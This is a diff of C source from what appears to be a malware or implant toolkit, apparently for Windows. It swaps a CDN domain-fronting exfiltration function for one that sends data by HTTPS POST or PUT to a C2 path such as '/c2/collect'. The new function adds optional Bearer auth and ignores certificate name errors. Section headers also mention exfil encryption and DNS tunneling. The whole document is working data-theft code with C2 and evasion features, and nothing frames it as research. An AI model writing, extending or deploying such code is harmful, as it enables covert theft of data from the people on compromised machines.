@@ -165,38 +165,46 @@ bool jocky_exfil_encrypt(const uint8_t* data, size_t data_len,
     return true;
 }
 
-/* ── Domain Fronting ────────────────────────────────────────────────── */
+/* ── HTTP/HTTPS Exfil ───────────────────────────────────────────────── */
 
 /*
- * POST data to path over HTTPS using CDN domain fronting.
+ * POST data to endpoint with optional Bearer token auth.
  *
- * front_host  – the CDN endpoint used for the TLS SNI and TCP connection
- *               (e.g. "d111111abcdef8.cloudfront.net" or "edge.azureedge.net")
- * real_host   – actual backend server name set in the HTTP Host header
- *               (the CDN routes based on this, not the SNI)
- * path        – URL path on the backend, e.g. "/c2/collect"
- *
- * TLS certificate CN validation is relaxed (the CDN cert lists front_host,
- * not real_host).  The connection is still fully TLS-encrypted end-to-end
- * to the CDN edge node.
+ * endpoint   – full HTTPS URL, e.g. "https://cdn.example.com/c2/collect"
+ * token      – Bearer auth token, or NULL/empty for unauthenticated
+ * data       – payload to send (null-terminated string)
+ * method     – HTTP method, e.g. "POST" or "PUT"
+ * chunk_size – reserved for future chunked uploads; currently unused
  */
-bool jocky_exfil_front(const char*    front_host,
-                        const char*    real_host,
-                        const char*    path,
-                        const uint8_t* data,
-                        size_t         data_len)
+bool jocky_exfil_front(const char* endpoint, const char* token,
+                        const char* data, const char* method, int32_t chunk_size)
 {
-    wchar_t wfront[512], wreal[512], wpath[512];
-    MultiByteToWideChar(CP_UTF8, 0, front_host, -1, wfront, 512);
-    MultiByteToWideChar(CP_UTF8, 0, real_host,  -1, wreal,  512);
-    MultiByteToWideChar(CP_UTF8, 0, path,        -1, wpath,  512);
+    if (!endpoint || !data) return false;
+    (void)chunk_size;
 
-    return winhttp_request(L"POST", wfront, INTERNET_DEFAULT_HTTPS_PORT,
-                           wpath,
+    wchar_t wurl[1024];
+    MultiByteToWideChar(CP_UTF8, 0, endpoint, -1, wurl, 1024);
+
+    wchar_t w_host[256] = {0}, w_path[768] = {0};
+    URL_COMPONENTS uc = {0};
+    uc.dwStructSize      = sizeof(uc);
+    uc.lpszHostName      = w_host; uc.dwHostNameLength = 256;
+    uc.lpszUrlPath       = w_path; uc.dwUrlPathLength  = 768;
+    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) return false;
+
+    wchar_t auth_hdr[512] = {0};
+    if (token && token[0])
+        _snwprintf(auth_hdr, 512, L"Authorization: Bearer %S\r\n", token);
+
+    wchar_t wmethod[16];
+    MultiByteToWideChar(CP_UTF8, 0, method ? method : "POST", -1, wmethod, 16);
+
+    size_t data_len = strlen(data);
+    return winhttp_request(wmethod, w_host, uc.nPort, w_path,
                            SECURITY_FLAG_IGNORE_CERT_CN_INVALID,
-                           wreal,   /* Host override */
                            NULL,
-                           data, data_len);
+                           auth_hdr[0] ? auth_hdr : NULL,
+                           (const uint8_t*)data, data_len);
 }
 
 /* ── DNS Tunneling ──────────────────────────────────────────────────── */
